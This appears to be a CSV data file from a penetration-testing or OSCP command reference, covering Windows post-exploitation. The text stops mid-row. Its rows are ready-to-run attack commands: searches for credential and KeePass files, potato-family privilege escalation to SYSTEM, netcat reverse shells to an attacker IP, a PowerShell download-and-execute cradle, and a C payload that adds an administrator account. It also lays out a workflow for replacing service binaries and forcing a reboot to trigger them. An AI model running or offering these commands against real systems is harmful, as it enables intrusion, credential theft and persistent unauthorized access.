"ps-enum-processes","Enumerate Running Processes with Paths","post-exploit","Get-Process | Where-Object {$_.Path} | Select-Object ProcessName,Id,Path | Sort-Object Path | Format-Table -AutoSize","List all running processes with their executable paths to identify vulnerable or interesting software","ENUMERATION","","Essential enumeration to identify:
- Outdated software with known CVEs
- Custom/internal applications
- Web servers (httpd, nginx, tomcat)
- Database servers (mysql, postgres, mssql)
- Backup software running as SYSTEM
- Services running from user-writable paths (DLL hijacking)

Look for processes NOT in C:\Windows - these are often exploitable.","high","","","","","{""Get-Process"": ""Retrieve all running processes on the system"", ""Where-Object {$_.Path}"": ""Filter to only processes with a valid path (excludes system processes without paths)"", ""Select-Object ProcessName,Id,Path"": ""Extract process name, PID, and full executable path"", ""Sort-Object Path"": ""Sort by path to group processes from same directory"", ""Format-Table -AutoSize"": ""Clean tabular output with auto-fitted columns""}","","[""ps-enum-processes-wmi"", ""ps-enum-processes-nonstandard""]","[""ps-enum-installed-apps"", ""searchsploit-local""]"
"ps-enum-processes-wmi","Enumerate Processes with Command Line (WMI)","post-exploit","Get-WmiObject Win32_Process | Select-Object Name,ProcessId,ExecutablePath,CommandLine | Format-Table -AutoSize -Wrap","List processes with full command line arguments using WMI - reveals configuration details and credentials","ENUMERATION","","WMI provides CommandLine which may contain:
- Database credentials: mysql -u root -pPassword123
- API keys in arguments
- Config file paths
- Service account credentials

Slower than Get-Process but much more information.","high","","","","","{""Get-WmiObject Win32_Process"": ""Query WMI for process information (more details than Get-Process)"", ""ExecutablePath"": ""Full path to the executable binary"", ""CommandLine"": ""Complete command line including arguments - may contain credentials!"", ""-Wrap"": ""Wrap long command lines instead of truncating""}","","[""ps-enum-processes""]","[""ps-search-credentials""]"
"ps-enum-processes-nonstandard","Find Processes Outside Windows Directory","post-exploit","Get-Process | Where-Object {$_.Path -and $_.Path -notlike 'C:\Windows\*'} | Select-Object ProcessName,Id,Path | Sort-Object Path | Format-Table -AutoSize","Filter for processes running from non-standard paths - likely third-party or vulnerable software","ENUMERATION","","Quick filter to find interesting processes:
- Web servers (XAMPP, WAMP, IIS apps)
- Custom applications
- Backup agents
- Remote access tools
- Database servers

These are prime targets for privilege escalation.","high","","","","","{""$_.Path -notlike 'C:\\Windows\\*'"": ""Exclude Windows system processes to focus on third-party software"", ""Sort-Object Path"": ""Group by installation directory for easier review""}","","[""ps-enum-processes""]","[""ps-enum-installed-apps"", ""searchsploit-local""]"
"ps-search-keepass-db","Search for KeePass Databases","post-exploit","Get-ChildItem -Path <SEARCH_PATH> -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue","Search filesystem for KeePass password manager database files (.kdbx) which may contain stored credentials","CREDENTIAL_HARVESTING","Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue","KeePass databases (.kdbx) are encrypted but can be cracked with keepass2john + hashcat/john.

Workflow after finding .kdbx:
1. Transfer file to Kali: copy \\KALI\share\db.kdbx
2. Extract hash: keepass2john Database.kdbx > keepass.hash
3. Crack: hashcat -m 13400 keepass.hash wordlist.txt

Also search for .kdb (older KeePass 1.x format).","high","","","","","{""-Path <SEARCH_PATH>"": ""Starting directory for recursive search (C:\\ for full drive)"", ""-Include *.kdbx"": ""Filter for KeePass database file extension"", ""-File"": ""Only return files, not directories"", ""-Recurse"": ""Search all subdirectories"", ""-ErrorAction SilentlyContinue"": ""Suppress access denied errors for clean output""}","","[""ps-search-password-files""]","[""keepass2john"", ""hashcat-keepass""]"
"ps-search-app-config","Search Application Directory for Config Files","post-exploit","Get-ChildItem -Path <APP_PATH> -Include *.txt,*.ini,*.conf,*.config,*.xml,*.json -File -Recurse -ErrorAction SilentlyContinue","Search an application's installation directory for configuration files that may contain credentials","CREDENTIAL_HARVESTING","Get-ChildItem -Path C:\xampp -Include *.txt,*.ini,*.conf,*.config,*.xml,*.json -File -Recurse -ErrorAction SilentlyContinue","Use after identifying installed apps with ps-enum-installed-apps.

Common Application Paths & High-Value Files:
| App         | Path               | High-Value Files                      |
|-------------|--------------------|---------------------------------------|
| XAMPP       | C:\xampp           | passwords.txt, my.ini, config.inc.php |
| WAMP        | C:\wamp            | my.ini, php.ini                       |
| IIS         | C:\inetpub         | web.config                            |
| Custom Apps | C:\Program Files\* | *.config, *.ini                       |
| App Data    | C:\ProgramData\*   | credentials.*, settings.*             |

Additional high-value files:
- config.inc.php (phpMyAdmin)
- my.ini/my.cnf (MySQL)
- pg_hba.conf (PostgreSQL)
- appsettings.json (.NET Core)","high","","","","","{""-Path <APP_PATH>"": ""Application installation directory (e.g., C:\\xampp, C:\\Program Files\\AppName)"", ""-Include *.txt,*.ini,*.conf,*.config,*.xml,*.json"": ""Common configuration file extensions"", ""-File"": ""Only return files, not directories"", ""-Recurse"": ""Search all subdirectories""}","[""ps-enum-installed-apps""]","[""ps-search-config-files""]","[""type-file"", ""ps-search-credentials""]"
"ps-search-user-documents","Search User Directory for Documents","post-exploit","Get-ChildItem -Path <USER_PATH> -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue","Search user home directory for documents that may contain sensitive information like passwords or notes","CREDENTIAL_HARVESTING","Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue","Users often store passwords in plain text files on Desktop - the digital Post-it note.

High-value locations:
- Desktop - quick access files
- Documents - work files
- Downloads - recently acquired files

Look for filenames containing: password, cred, login, vpn, ssh, key, secret, backup","high","","","","","{""-Path <USER_PATH>"": ""User home directory (C:\\Users\\username\\)"", ""-Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx"": ""Common document formats that may contain sensitive info"", ""-File"": ""Only return files, not directories"", ""-Recurse"": ""Search Desktop, Documents, Downloads, and all subdirectories""}","","[""ps-search-password-files""]","[""type-file"", ""ps-search-credentials""]"
"ps-search-password-files","Search for Password-Related Files","post-exploit","Get-ChildItem -Path <SEARCH_PATH> -Include *password*,*cred*,*secret*,*.kdbx,*login*,*backup* -File -Recurse -ErrorAction SilentlyContinue","Search for files with password-related keywords in filename across the system","CREDENTIAL_HARVESTING","Get-ChildItem -Path C:\ -Include *password*,*cred*,*secret*,*.kdbx,*login*,*backup* -File -Recurse -ErrorAction SilentlyContinue","Quick win command to find low-hanging fruit credentials.

Common finds:
- passwords.txt - plaintext password lists
- credentials.xml - application saved credentials
- *.kdbx - KeePass databases
- *backup* - database or config backups

Expand search patterns as needed: *vpn*, *ssh*, *key*, *token*","high","","","","","{""-Include *password*,*cred*,*secret*,*.kdbx,*login*,*backup*"": ""Common patterns for sensitive files"", ""-File"": ""Only return files, not directories"", ""-Recurse"": ""Search all subdirectories""}","","[""ps-search-keepass-db"", ""ps-search-user-documents""]","[""type-file""]"
"ps-search-config-files","Search for Application Config Files","post-exploit","Get-ChildItem -Path <SEARCH_PATH> -Include *.ini,*.config,*.xml,*.conf,web.config,*.json -File -Recurse -ErrorAction SilentlyContinue","Search for application configuration files that commonly contain hardcoded credentials","CREDENTIAL_HARVESTING","Get-ChildItem -Path C:\ -Include *.ini,*.config,*.xml,*.conf,web.config,*.json -File -Recurse -ErrorAction SilentlyContinue","Configuration files often contain:
- Database connection strings with passwords
- API keys and tokens
- Service account credentials
- SMTP credentials

High-value targets:
- C:\inetpub\wwwroot\web.config - IIS/ASP.NET
- C:\xampp\*\*.ini - XAMPP stack
- C:\Program Files\*\*.config - Installed apps","high","","","","","{""-Include *.ini,*.config,*.xml,*.conf,web.config,*.json"": ""Common configuration file extensions"", ""-File"": ""Only return files, not directories"", ""-Recurse"": ""Search all subdirectories""}","","","[""type-file"", ""ps-search-credentials""]"
"printspoofer-interactive","PrintSpoofer Interactive Shell","post-exploit","PrintSpoofer64.exe -i -c cmd","Spawn interactive SYSTEM shell using PrintSpoofer (Windows 10 1809+, Server 2019+)","","PrintSpoofer64.exe -i -c cmd","Requires SeImpersonatePrivilege. Uses Print Spooler service for token capture. Best choice for modern Windows. If fails, try GodPotato.","high","","","","","{""-i"": ""Interactive mode - spawns new console window"", ""-c cmd"": ""Command to execute as SYSTEM - cmd.exe for interactive shell""}","","",""
"printspoofer-reverse-shell","PrintSpoofer Reverse Shell","post-exploit","PrintSpoofer64.exe -c ""<NC_PATH> <LHOST> <LPORT> -e cmd.exe""","Spawn SYSTEM reverse shell using PrintSpoofer","","PrintSpoofer64.exe -c ""C:\Windows\Temp\nc.exe 10.10.14.5 4445 -e cmd.exe""","Upload nc.exe first. Start listener: nc -nlvp 4445. Alternative: use PowerShell reverse shell instead of nc.exe.","high","","","","","","","",""
"printspoofer-add-user","PrintSpoofer Add Admin User","post-exploit","PrintSpoofer64.exe -c ""net user <USERNAME> <PASSWORD> /add && net localgroup administrators <USERNAME> /add""","Create local administrator account using PrintSpoofer SYSTEM privileges","","PrintSpoofer64.exe -c ""net user pwned Password123! /add && net localgroup administrators pwned /add""","Creates persistent admin access. Use complex password to meet policy requirements. Can then RDP or PSExec as new user.","high","","","","","","","",""
"godpotato-cmd","GodPotato Execute Command","post-exploit","GodPotato-NET4.exe -cmd ""cmd /c <COMMAND>""","Execute command as SYSTEM using GodPotato (works without Print Spooler)","","GodPotato-NET4.exe -cmd ""cmd /c whoami""","Uses DCOM/RPCSS instead of Print Spooler. Works when PrintSpoofer fails. Use NET4 for modern Windows, NET2 for older. Requires SeImpersonatePrivilege.","high","","","","","{""-cmd"": ""Command to execute in SYSTEM context""}","","",""
"godpotato-reverse-shell","GodPotato Reverse Shell","post-exploit","GodPotato-NET4.exe -cmd ""<NC_PATH> <LHOST> <LPORT> -e cmd.exe""","Spawn SYSTEM reverse shell using GodPotato","","GodPotato-NET4.exe -cmd ""C:\Windows\Temp\nc.exe 10.10.14.5 4445 -e cmd.exe""","Alternative to PrintSpoofer when Print Spooler disabled. Start listener first.","high","","","","","","","",""
"godpotato-powershell","GodPotato PowerShell Execution","post-exploit","GodPotato-NET4.exe -cmd ""powershell -ep bypass -c <POWERSHELL_COMMAND>""","Execute PowerShell command as SYSTEM using GodPotato","","GodPotato-NET4.exe -cmd ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')""","Use -ep bypass to override execution policy. For encoded payloads: powershell -e <BASE64>. Useful for downloading and executing scripts.","high","","","","","","","",""
"juicypotato-execute","JuicyPotato Execute","post-exploit","JuicyPotato.exe -l <LOCAL_PORT> -p <BATCH_FILE> -t * -c {<CLSID>}","Execute command as SYSTEM using JuicyPotato (Windows 2016 and earlier)","","JuicyPotato.exe -l 1337 -p C:\Windows\Temp\rev.bat -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}","Does NOT work on Windows 10 1809+ or Server 2019+. Find CLSIDs: https://github.com/ohpe/juicy-potato/tree/master/CLSID. Common: {4991d34b-80a1-4291-83b6-3328366b9097}","high","","","","","{""-l"": ""Local COM server listening port"", ""-p"": ""Program/batch file to execute as SYSTEM"", ""-t *"": ""Try both CreateProcessWithToken and CreateProcessAsUser"", ""-c"": ""CLSID to abuse - must be valid for target Windows version""}","","",""
"juicypotato-clsid-wmi","JuicyPotato with WMI CLSID","post-exploit","JuicyPotato.exe -l 1337 -p <BATCH_FILE> -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}","JuicyPotato using WMI CLSID (reliable on Server 2016)","","JuicyPotato.exe -l 1337 -p C:\Windows\Temp\rev.bat -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}","WMI CLSID {8BC3F05E-D86B-11D0-A075-00C04FB68820} works on many Server 2016 installations. Try if default CLSID fails.","high","","","","","","","",""
"juicypotato-clsid-test","JuicyPotato CLSID Test","post-exploit","JuicyPotato.exe -l 1337 -p C:\Windows\Temp\rev.bat -t * -c {<CLSID>}","Test different CLSIDs for JuicyPotato until one works","","JuicyPotato.exe -l 1337 -p C:\Windows\Temp\rev.bat -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}","Common CLSIDs to try: Server 2016: {8BC3F05E-D86B-11D0-A075-00C04FB68820}, {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}. Server 2012 R2: {03ca98d6-ff5d-49b8-abc6-03dd84127020}","medium","","","","","","","",""
"juicypotato-create-bat","Create JuicyPotato Batch File","post-exploit","echo <NC_PATH> <LHOST> <LPORT> -e cmd.exe > C:\Windows\Temp\rev.bat","Create batch file for JuicyPotato reverse shell execution","","echo C:\Windows\Temp\nc.exe 10.10.14.5 4445 -e cmd.exe > C:\Windows\Temp\rev.bat","JuicyPotato -p requires file path. Create batch file with reverse shell command. Then execute with JuicyPotato.","high","","","","","","","",""
"roguepotato-execute","RoguePotato Execute","post-exploit","RoguePotato.exe -r <ATTACKER_IP> -l <LOCAL_PORT> -e ""<COMMAND>""","Execute command as SYSTEM using RoguePotato with network OXID relay","","RoguePotato.exe -r 10.10.14.5 -l 9999 -e ""C:\Windows\Temp\nc.exe 10.10.14.5 4445 -e cmd.exe""","Requires attacker to run socat relay: sudo socat tcp-listen:135,reuseaddr,fork tcp:TARGET:9999. Bypasses localhost DCOM restrictions.","medium","","","","","{""-r"": ""Remote IP for OXID resolution (attacker machine)"", ""-l"": ""Local port for RPC listener"", ""-e"": ""Command to execute with SYSTEM privileges""}","","",""
"roguepotato-simple","RoguePotato Simple Mode","post-exploit","RoguePotato.exe -r <ATTACKER_IP> -e ""<COMMAND>""","RoguePotato without local port specification (uses built-in OXID resolver)","","RoguePotato.exe -r 10.10.14.5 -e ""whoami""","Simplified mode if attacker has port 135 accessible. RoguePotato includes built-in OXID resolver.","medium","","","","","","","",""
"sweetpotato-auto","SweetPotato Auto-Select","post-exploit","SweetPotato.exe -a ""<COMMAND>""","Execute command as SYSTEM using SweetPotato with automatic technique selection","","SweetPotato.exe -a ""C:\Windows\Temp\nc.exe 10.10.14.5 4445 -e cmd.exe""","SweetPotato combines PrintSpoofer, EfsPotato, and JuicyPotato. Auto-selects best technique for target OS. Good first choice when unsure which potato to use.","high","","","","","{""-a"": ""Arguments to pass to spawned process""}","","",""
"sweetpotato-efs","SweetPotato EFS Mode","post-exploit","SweetPotato.exe -e EfsPotato -p <PROGRAM> -a ""<ARGUMENTS>""","Force SweetPotato to use EfsPotato technique (EFS RPC abuse)","","SweetPotato.exe -e EfsPotato -p C:\Windows\System32\cmd.exe -a ""/c C:\Windows\Temp\nc.exe 10.10.14.5 4445 -e cmd.exe""","EfsPotato works when Spooler disabled. Uses Encrypting File System RPC. Backup technique when standard methods fail.","high","","","","","{""-e EfsPotato"": ""Force EfsPotato technique using EFS RPC"", ""-p"": ""Program path to execute"", ""-a"": ""Arguments for the program""}","","",""
"sweetpotato-interactive","SweetPotato Interactive Shell","post-exploit","SweetPotato.exe -p C:\Windows\System32\cmd.exe","Spawn interactive SYSTEM cmd.exe using SweetPotato","","SweetPotato.exe -p C:\Windows\System32\cmd.exe","Spawns new cmd.exe as SYSTEM. Use when you have console access. For remote shell, use -a with reverse shell command.","high","","","","","{""-p"": ""Program to execute - cmd.exe for interactive shell""}","","",""
"socat-relay-135","Socat OXID Relay for RoguePotato","post-exploit","sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET_IP>:<TARGET_PORT>","Set up socat relay on attacker machine for RoguePotato OXID resolution","","sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.45.100:9999","Run on attacker (Kali). Relays RPC traffic from attacker:135 to target:9999. Requires root for port 135. Start before running RoguePotato.","medium","","","","","","","",""
"win-service-binary-enum-running","Enumerate Running Services with Binary Paths","post-exploit","Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}","List all running Windows services with their binary paths using WMI. Focus on non-Windows paths (C:\xampp, C:\Program Files\CustomApp) as these are more likely misconfigured.","service-binary-hijacking","","CRITICAL for service binary hijacking enumeration.

Focus on services with paths OUTSIDE C:\Windows\System32:
- C:\xampp\ (XAMPP stack)
- C:\Program Files\<CustomApp>\
- C:\inetpub\
- Any user-installed software

These are more likely to have weak permissions because administrators set Full Access to avoid permission problems during installation.

IMPORTANT: Using network logon (WinRM, bind shell) may result in 'permission denied'. Use interactive logon (RDP) if possible.

Time estimate: 5 seconds

Manual alternative (CMD):
wmic service get Name,PathName,State | findstr Running","high","","{""purpose"": ""Identify services with binary paths outside protected Windows directories that may have exploitable permissions"", ""manual_alternative"": ""wmic service get Name,PathName,State | findstr Running"", ""common_failures"": [""Permission denied with non-interactive logon (use RDP instead)"", ""Empty output if no services running""], ""when_to_use"": [""Initial privilege escalation enumeration"", ""After gaining shell on Windows target"", ""When looking for user-installed services""], ""time_estimate"": ""5 seconds"", ""technical_notes"": [""Get-CimInstance uses DCOM/WinRM for remote queries"", ""win32_service WMI class contains service configuration"", ""PathName includes command-line arguments""]}","","{""Access denied"": ""Try from RDP session instead of reverse shell. Network logons have restricted WMI access."", ""Get-CimInstance not found"": ""Use Get-WmiObject (older systems) or wmic command instead"", ""Empty results"": ""No running services or insufficient permissions. Try: Get-Service""}","{""Get-CimInstance"": ""Modern PowerShell cmdlet to query WMI classes (supersedes Get-WmiObject)"", ""-ClassName win32_service"": ""Query the Win32_Service WMI class containing all service information"", ""Select Name,State,PathName"": ""Return only service name, current state, and binary path"", ""Where-Object {$_.State -like 'Running'}"": ""Filter to show only services currently in Running state""}","","[""win-wmic-service-path"", ""win-ps-get-service-details""]","[""win-icacls-binary-check"", ""win-service-startmode-check"", ""win-sc-query-config""]"
"win-icacls-binary-check","Check Service Binary File Permissions","post-exploit","icacls ""<BINARY_PATH>""","Check file permissions on a service binary using icacls. Look for Full (F), Modify (M), or Write (W) permissions for BUILTIN\Users, Everyone, or Authenticated Users groups.","service-binary-hijacking","icacls ""C:\xampp\mysql\bin\mysqld.exe""","CRITICAL permission check for service binary hijacking.

Permission Mask Reference:
  F  = Full access (can read, write, execute, delete, change permissions)
  M  = Modify access (can read, write, execute, delete)
  RX = Read and execute (NOT exploitable)
  R  = Read-only (NOT exploitable)
  W  = Write-only (exploitable - can replace file)

Vulnerable if you see:
  BUILTIN\Users:(F)  - Full control for all users
  BUILTIN\Users:(M)  - Modify access for all users
  Everyone:(F)       - Full control for everyone
  NT AUTHORITY\Authenticated Users:(M) - Modify for authenticated users

(I) prefix indicates inherited permission from parent folder.
No (I) means permission was explicitly set on this file.

Time estimate: 2 seconds

PowerShell alternative:
Get-Acl ""<PATH>"" | Format-List","high","","{""purpose"": ""Determine if current user can write/modify the service binary to replace it with malicious payload"", ""manual_alternative"": ""Get-Acl \""<PATH>\"" | Format-List"", ""common_failures"": [""File path doesn't exist (typo or service not installed)"", ""Access denied viewing ACL (rare)""], ""when_to_use"": [""After identifying service with non-Windows binary path"", ""Verifying if binary can be replaced"", ""Before attempting exploitation""], ""time_estimate"": ""2 seconds"", ""technical_notes"": [""icacls shows both explicit and inherited permissions"", ""(I) prefix = inherited from parent directory"", ""Missing (I) = explicitly set permission (more reliable)"", ""BUILTIN\\Users includes all local user accounts""]}","","{""Access is denied"": ""Need at least read permissions on the file/directory"", ""File not found"": ""Verify path from service enumeration - may include arguments"", ""Only (RX) permissions shown"": ""Not exploitable via binary replacement - try DLL hijacking or unquoted path instead""}","{""icacls"": ""Windows command to display or modify discretionary access control lists (DACLs)"", ""\""<BINARY_PATH>\"""": ""Path to file - quotes required for paths with spaces""}","[""win-service-binary-enum-running""]","[""win-get-acl-check""]","[""win-cross-compile-adduser"", ""win-msfvenom-service-exe"", ""win-service-binary-replace""]"
"win-service-startmode-check","Check Service Startup Type (Auto/Manual)","post-exploit","Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<SERVICE_NAME>'}","Check if a service is configured for automatic startup. If Auto, the malicious binary will execute on reboot without needing manual service restart permissions.","service-binary-hijacking","Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}","CRITICAL: Determines exploitation strategy.

StartMode values:
  Auto     = Service starts automatically at boot (GOOD - reboot triggers payload)
  Manual   = Service must be started manually (need restart permissions)
  Disabled = Service won't start (NOT exploitable unless re-enabled)

Why this matters:
- If Auto: Can trigger payload via system reboot
- If Manual: Need permissions to restart service (usually admin only)

Most user-installed services (MySQL, Apache, custom apps) are set to Auto.

Time estimate: 2 seconds

CMD alternative:
sc qc <SERVICE_NAME> | findstr START_TYPE","high","","{""purpose"": ""Determine if system reboot will trigger malicious service binary execution"", ""manual_alternative"": ""sc qc <SERVICE_NAME> | findstr START_TYPE"", ""common_failures"": [""Service name mismatch (use exact name from enumeration)""], ""when_to_use"": [""After confirming writable service binary"", ""Before determining restart method"", ""Planning exploitation timeline""], ""time_estimate"": ""2 seconds"", ""technical_notes"": [""Auto services start during boot sequence"", ""Reboot is often only option if can't restart service directly""]}","","{""No results"": ""Service name is case-sensitive or doesn't exist. Use: Get-Service | Where-Object {$_.Name -like '*<partial>*'}"", ""StartMode is Manual"": ""Need admin rights to restart, or find different service""}","{""Get-CimInstance -ClassName win32_service"": ""Query WMI for service information"", ""Select Name, StartMode"": ""Return service name and startup configuration"", ""Where-Object {$_.Name -like '<SERVICE_NAME>'}"": ""Filter for specific service name""}","[""win-service-binary-enum-running""]","[""win-sc-query-config""]","[""win-whoami-shutdown-priv"", ""win-net-stop-service"", ""win-shutdown-reboot""]"
"win-whoami-shutdown-priv","Check SeShutdownPrivilege for Reboot Capability","post-exploit","whoami /priv","List all privileges assigned to current user. Look for SeShutdownPrivilege which allows initiating system reboot to trigger auto-start service exploitation.","service-binary-hijacking","","SeShutdownPrivilege is required to initiate system reboot.

State explanation:
  Enabled  = Privilege currently active
  Disabled = Privilege assigned but not currently active

IMPORTANT: 'Disabled' state just means not in use - the user CAN still reboot!
The privilege being PRESENT (even if Disabled) means you can use shutdown command.

If SeShutdownPrivilege is NOT listed at all:
- Cannot reboot system
- Must find way to restart service manually
- May need to wait for admin to reboot

Most standard users have SeShutdownPrivilege.

Time estimate: 1 second

Also check for other useful privileges:
  SeImpersonatePrivilege - Potato exploits (faster path to SYSTEM)
  SeDebugPrivilege - Process memory access","high","","{""purpose"": ""Confirm ability to reboot system for triggering auto-start service exploitation"", ""manual_alternative"": ""No alternative - whoami /priv is the standard method"", ""common_failures"": [""Privilege not assigned (restricted service account)""], ""when_to_use"": [""After confirming service is auto-start"", ""Before planning exploitation timing"", ""When direct service restart fails""], ""time_estimate"": ""1 second"", ""technical_notes"": [""Disabled state doesn't prevent usage - just means not currently active"", ""Privilege must be PRESENT in list to use it"", ""Standard users typically have SeShutdownPrivilege""]}","","{""SeShutdownPrivilege not listed"": ""User cannot reboot - need different escalation path or wait for admin reboot"", ""All privileges Disabled"": ""Normal - privileges activate on use, presence is what matters""}","{""whoami"": ""Display current user information"", ""/priv"": ""Show all privileges assigned to the user's token""}","","","[""win-shutdown-reboot"", ""win-service-binary-replace""]"
"win-net-stop-service","Attempt to Stop Service (Requires Admin)","post-exploit","net stop <SERVICE_NAME>","Attempt to stop a Windows service. Usually requires administrator privileges. If 'Access is denied', fall back to reboot method.","service-binary-hijacking","net stop mysql","Usually fails for low-privilege users.

Expected behavior:
  Success = 'The <service> service was stopped successfully'
  Failure = 'System error 5 has occurred. Access is denied.'

If access denied:
  1. Verify service is Auto-start
  2. Check SeShutdownPrivilege
  3. Use reboot method instead

sc.exe alternative:
  sc stop <SERVICE_NAME>

Time estimate: 2 seconds","medium","","{""purpose"": ""Attempt direct service restart after binary replacement"", ""manual_alternative"": ""sc stop <SERVICE_NAME>"", ""common_failures"": [""Access denied (expected for low-priv user)"", ""Service dependencies prevent stop""], ""when_to_use"": [""After replacing service binary"", ""Before falling back to reboot method""], ""time_estimate"": ""2 seconds""}","","{""Access is denied"": ""Expected for non-admin users. Use reboot method if SeShutdownPrivilege available."", ""Service has dependent services"": ""Stop dependent services first or use reboot""}","{""net stop"": ""Windows command to stop a running service"", ""<SERVICE_NAME>"": ""Service name (not display name)""}","[""win-service-binary-replace""]","[""win-sc-stop-service""]","[""win-net-start-service"", ""win-shutdown-reboot""]"
"win-net-start-service","Start Service After Stop","post-exploit","net start <SERVICE_NAME>","Start a Windows service after stopping it. If both stop and start succeed, malicious binary executes immediately.","service-binary-hijacking","net start mysql","Execute immediately after net stop if successful.

After service starts with replaced binary:
- Adduser payload: Check 'net localgroup administrators'
- Reverse shell payload: Check listener for callback

Time estimate: 2 seconds","medium","","{""purpose"": ""Trigger execution of replaced malicious service binary"", ""manual_alternative"": ""sc start <SERVICE_NAME>"", ""time_estimate"": ""2 seconds""}","","","{""net start"": ""Windows command to start a stopped service"", ""<SERVICE_NAME>"": ""Service name (not display name)""}","[""win-net-stop-service""]","","[""win-localgroup-admins-check"", ""win-verify-new-user""]"
"win-shutdown-reboot","Reboot System to Trigger Auto-Start Service","post-exploit","shutdown /r /t 0","Initiate immediate system reboot. Used when cannot manually restart service but service is configured for auto-start. Requires SeShutdownPrivilege.","service-binary-hijacking","","WARNING: Only use reboot in controlled environments!

In real penetration tests:
- Coordinate with client IT staff
- Avoid production systems if possible
- Reboots are logged and noticeable
- System may not come back up (rare but possible)

For OSCP exam: Reboots are acceptable since they're lab machines.

After reboot:
1. Reconnect via RDP or reverse shell
2. Verify exploitation succeeded
3. Check if user was created or shell connected

Scheduled reboot alternative:
  shutdown /r /t 60 (reboot in 60 seconds)

Cancel scheduled reboot:
  shutdown /a

Time estimate: 1-3 minutes for full reboot cycle","high","","{""purpose"": ""Trigger auto-start service execution after binary replacement"", ""manual_alternative"": ""shutdown /r /t 60 (with delay for preparation)"", ""common_failures"": [""Access denied (SeShutdownPrivilege missing)"", ""System fails to boot (rare)""], ""when_to_use"": [""After service binary replaced"", ""When direct service restart denied"", ""Service is Auto-start mode""], ""time_estimate"": ""1-3 minutes"", ""technical_notes"": [""Requires SeShutdownPrivilege"", ""Service starts during boot sequence"", ""Network connections lost during reboot""]}","","{""Access is denied"": ""User lacks SeShutdownPrivilege - need different approach"", ""System won't reconnect"": ""Wait longer, check if system actually booted, verify network connectivity""}","{""shutdown"": ""Windows shutdown utility"", ""/r"": ""Reboot after shutdown (instead of power off)"", ""/t 0"": ""Timeout in seconds before action (0 = immediate)""}","[""win-service-binary-replace"", ""win-service-startmode-check"", ""win-whoami-shutdown-priv""]","","[""win-localgroup-admins-check""]"
"win-service-binary-replace","Replace Service Binary with Malicious Payload","post-exploit","move <ORIGINAL_PATH> <BACKUP_PATH> && move <PAYLOAD_PATH> <ORIGINAL_PATH>","Backup original service binary and replace with malicious payload. Uses move command for atomic operation.","service-binary-hijacking","move C:\xampp\mysql\bin\mysqld.exe C:\Users\dave\mysqld.exe.bak && move C:\Users\dave\adduser.exe C:\xampp\mysql\bin\mysqld.exe","ALWAYS backup original binary!

Best practice workflow:
1. Backup original: move C:\path\service.exe C:\Users\you\service.exe.bak
2. Transfer payload to target
3. Replace binary: move C:\Users\you\payload.exe C:\path\service.exe
4. Restart service or reboot
5. Verify exploitation
6. Restore original: move C:\Users\you\service.exe.bak C:\path\service.exe

PowerShell alternative:
  Move-Item -Path ""<ORIGINAL>"" -Destination ""<BACKUP>""
  Move-Item -Path ""<PAYLOAD>"" -Destination ""<ORIGINAL>""

If 'file is being used':
- Service is currently running
- Try stopping service first (if possible)
- Some services can have binary replaced while running

Time estimate: 5 seconds","high","","{""purpose"": ""Replace legitimate service binary with malicious payload"", ""manual_alternative"": ""copy commands work but move is cleaner"", ""common_failures"": [""Access denied (binary not writable - verify icacls)"", ""File in use (service running - stop first if possible)""], ""when_to_use"": [""After confirming writable permissions"", ""After transferring payload to target""], ""time_estimate"": ""5 seconds""}","","{""Access is denied"": ""Double-check permissions with icacls - may not actually be writable"", ""File is being used"": ""Service has binary locked. Some services allow replacement while running, try anyway then restart."", ""Cannot find file"": ""Verify exact path from service enumeration""}","{""move"": ""Rename/move file (atomic operation, preserves timestamps better than copy)"", ""&&"": ""Execute second command only if first succeeds""}","[""win-icacls-binary-check"", ""win-cross-compile-adduser""]","","[""win-net-stop-service"", ""win-shutdown-reboot""]"
"win-cross-compile-adduser","Cross-Compile Adduser Payload (Kali)","post-exploit","x86_64-w64-mingw32-gcc adduser.c -o adduser.exe","Cross-compile C source code to Windows 64-bit executable on Kali Linux. Creates payload that adds local admin user when executed by service.","service-binary-hijacking","","Run on Kali Linux, NOT on Windows target.

Source code template (save as adduser.c):
```c
#include <stdlib.h>

int main() {
  int i;
  i = system(""net user dave2 password123! /add"");
  i = system(""net localgroup administrators dave2 /add"");
  return 0;
}
```

For 32-bit targets:
  i686-w64-mingw32-gcc adduser.c -o adduser.exe

Install mingw-w64 if missing:
  sudo apt install mingw-w64

Advantages over msfvenom:
- Smaller file size
- Less likely to trigger AV
- Customizable actions
- No network callback required

Time estimate: 2 seconds

Verify compilation:
  file adduser.exe
  Should show: PE32+ executable (console) x86-64, for MS Windows","high","","{""purpose"": ""Create custom Windows payload for service binary hijacking"", ""manual_alternative"": ""Use msfvenom for reverse shell instead"", ""common_failures"": [""mingw-w64 not installed"", ""Wrong architecture (32-bit vs 64-bit)"", ""Syntax errors in C code""], ""when_to_use"": [""When network callback not possible/desired"", ""When avoiding AV detection"", ""For simple user creation payload""], ""time_estimate"": ""2 seconds"", ""technical_notes"": [""x86_64 = 64-bit target"", ""i686 = 32-bit target"", ""MinGW creates native Windows executables from Linux""]}","","{""command not found"": ""Install mingw-w64: sudo apt install mingw-w64"", ""undefined reference to system"": ""Missing stdlib.h include"", ""Wrong architecture"": ""Check target with systeminfo - use i686-w64-mingw32-gcc for 32-bit""}","{""x86_64-w64-mingw32-gcc"": ""MinGW-w64 cross-compiler for 64-bit Windows targets"", ""adduser.c"": ""Source file containing adduser code"", ""-o adduser.exe"": ""Output filename for compiled 